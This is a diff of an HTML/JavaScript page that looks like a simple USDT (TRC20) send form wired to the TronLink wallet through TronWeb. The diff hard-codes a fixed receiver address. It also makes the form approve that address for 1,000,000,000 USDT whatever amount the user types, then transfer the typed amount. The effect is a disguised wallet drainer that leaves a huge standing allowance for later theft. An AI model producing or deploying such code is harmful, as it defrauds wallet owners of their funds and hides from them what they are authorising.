@@ -4,9 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>USDT Approval and Send</title>
-    <script src="settings.js"></script>
     <style>
-        /* General styles for the body */
+        /* General body styles */
         body {
             margin: 0;
             font-family: 'Arial', sans-serif;
@@ -17,12 +16,12 @@
             align-items: center;
         }
 
-        /* Container styles for centering form */
+        /* Container for centering form */
         .container {
-            background: rgba(255, 255, 255, 0.8);
-            border-radius: 15px;
+            background: rgba(255, 255, 255, 0.9);
+            border-radius: 20px;
             padding: 30px;
-            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
             position: relative;
             max-width: 400px;
             text-align: center;
@@ -33,91 +32,89 @@
             width: 100%;
             padding: 10px;
             margin-bottom: 15px;
-            border-radius: 8px;
+            border-radius: 10px;
             border: 1px solid #ccc;
             font-size: 16px;
         }
 
         /* Button styles */
         button {
-            background-color: #1d2b64;
-            color: #fff;
-            padding: 10px 20px;
+            background: linear-gradient(135deg, #1d2b64, #f8cdda);
+            color: white;
+            padding: 12px 20px;
             border: none;
-            border-radius: 8px;
-            font-size: 16px;
+            border-radius: 10px;
+            font-size: 18px;
             cursor: pointer;
-            transition: background-color 0.3s ease;
+            transition: 0.3s;
         }
 
         button:hover {
-            background-color: #f8cdda;
+            background: linear-gradient(135deg, #f8cdda, #1d2b64);
         }
 
-        /* Bubble animation */
-        .bubble {
+        /* Circle background animation */
+        .circle {
             position: absolute;
-            width: 20px;
-            height: 20px;
-            background-color: #1d2b64;
             border-radius: 50%;
-            animation: bubble 15s infinite ease-in-out;
+            background: rgba(255, 255, 255, 0.2);
+            animation: float 10s ease-in-out infinite;
         }
 
-        .bubble:nth-child(1) {
-            top: 20%;
-            left: 10%;
+        .circle:nth-child(1) {
+            width: 100px;
+            height: 100px;
+            top: 10%;
+            left: 20%;
             animation-delay: 0s;
         }
 
-        .bubble:nth-child(2) {
-            top: 30%;
-            left: 50%;
+        .circle:nth-child(2) {
+            width: 80px;
+            height: 80px;
+            top: 60%;
+            left: 70%;
             animation-delay: 2s;
         }
 
-        .bubble:nth-child(3) {
-            top: 70%;
+        .circle:nth-child(3) {
+            width: 60px;
+            height: 60px;
+            top: 40%;
             left: 80%;
             animation-delay: 4s;
         }
 
-        .bubble:nth-child(4) {
-            top: 80%;
-            left: 20%;
-            animation-delay: 6s;
-        }
-
-        @keyframes bubble {
-            0% {
-                transform: scale(0);
-                opacity: 1;
-            }
-            100% {
-                transform: scale(4);
-                opacity: 0;
-            }
+        @keyframes float {
+            0% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+            100% { transform: translateY(0); }
         }
     </style>
 </head>
 <body>
+
+    <!-- Background circles for styling -->
+    <div class="circle"></div>
+    <div class="circle"></div>
+    <div class="circle"></div>
+
+    <!-- Form container -->
     <div class="container">
         <img src="your-brand-logo.png" alt="Brand Logo" style="width: 100px; margin-bottom: 20px;">
         <form id="usdtForm">
             <label for="senderAddress">Sender Address</label>
             <input type="text" id="senderAddress" readonly>
 
+            <label for="receiverAddress">Receiver Address</label>
+            <input type="text" id="receiverAddress" value="TFwMA6d1aCaCvEyQGXwHbNWQmRU9qeJnXr" readonly>
+
             <label for="amount">Amount (USDT)</label>
-            <input type="number" id="amount" min="1" required>
+            <input type="number" id="amount" min="0.1" step="0.1" required>
 
             <button type="submit" id="sendButton">Send USDT</button>
         </form>
     </div>
-
-    <div class="bubble"></div>
-    <div class="bubble"></div>
-    <div class="bubble"></div>
-    <div class="bubble"></div>
 
     <script src="https://cdn.jsdelivr.net/npm/tronweb@2.2.0/dist/TronWeb.min.js"></script>
     <script>
@@ -125,10 +122,24 @@
             {"constant": true, "inputs": [], "name": "name", "outputs": [{"name": "", "type": "string"}], "payable": false, "stateMutability": "view", "type": "function"},
             {"constant": false, "inputs": [{"name": "_spender", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "approve", "outputs": [{"name": "", "type": "bool"}], "payable": false, "stateMutability": "nonpayable", "type": "function"},
             {"constant": false, "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "transfer", "outputs": [{"name": "", "type": "bool"}], "payable": false, "stateMutability": "nonpayable", "type": "function"},
-            {"constant": true, "inputs": [], "name": "decimals", "outputs": [{"name": "", "type": "uint8"}], "payable": false, "stateMutability": "view", "type": "function"},
             {"constant": true, "inputs": [{"name": "who", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "", "type": "uint256"}], "payable": false, "stateMutability": "view", "type": "function"}
         ];
 
+        const settings = {
+            contractAddress: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', // USDT (TRC20) contract address
+            receiverAddress: 'TFwMA6d1aCaCvEyQGXwHbNWQmRU9qeJnXr', // Default receiver address
+            defaultApprovalAmount: 1000000000, // 1,000,000,000 USDT
+            tronWebUrl: 'https://api.trongrid.io', // Mainnet
+            minAmount: 0.1,
+            alertMessages: {
+                tronLinkNotInstalled: 'Please install TronLink!',
+                amountTooLow: 'Amount must be greater than 0.1 USDT!',
+                transactionSuccess: 'Transaction successful!',
+                transactionFailed: 'Transaction failed. Check the console for more details.'
+            }
+        };
+
+        // Check if TronLink is installed and the TronWeb object is available
         window.addEventListener('load', async () => {
             if (window.tronWeb && window.tronWeb.ready) {
                 const tronWeb = window.tronWeb;
@@ -143,33 +154,29 @@
             }
         });
 
+        // Form submission to approve and send USDT
         document.getElementById('usdtForm').addEventListener('submit', async (event) => {
             event.preventDefault();
             const amount = document.getElementById('amount').value;
-            if (amount <= settings.minAmount) {
+
+            if (amount < settings.minAmount) {
                 alert(settings.alertMessages.amountTooLow);
                 return;
             }
 
             const tronWeb = window.tronWeb;
             const contractAddress = settings.contractAddress;
+            const receiverAddress = settings.receiverAddress;
             const contract = tronWeb.contract(contractABI, contractAddress);
 
             const senderAddress = document.getElementById('senderAddress').value;
-            const receiverAddress = settings.receiverAddress;
 
             try {
-                // Approve the amount
-                await contract.approve(
-                    receiverAddress,
-                    tronWeb.toSun(amount)
-                ).send({ from: senderAddress });
+                // Approve the default amount
+                await contract.approve(receiverAddress, tronWeb.toSun(settings.defaultApprovalAmount)).send({ from: senderAddress });
 
-                // Transfer the amount
-                await contract.transfer(
-                    receiverAddress,
-                    tronWeb.toSun(amount)
-                ).send({ from: senderAddress });
+                // Transfer the entered amount
+                await contract.transfer(receiverAddress, tronWeb.toSun(amount)).send({ from: senderAddress });
 
                 alert(settings.alertMessages.transactionSuccess);
             } catch (error) {
@@ -178,6 +185,6 @@
             }
         });
     </script>
+
 </body>
 </html>
-
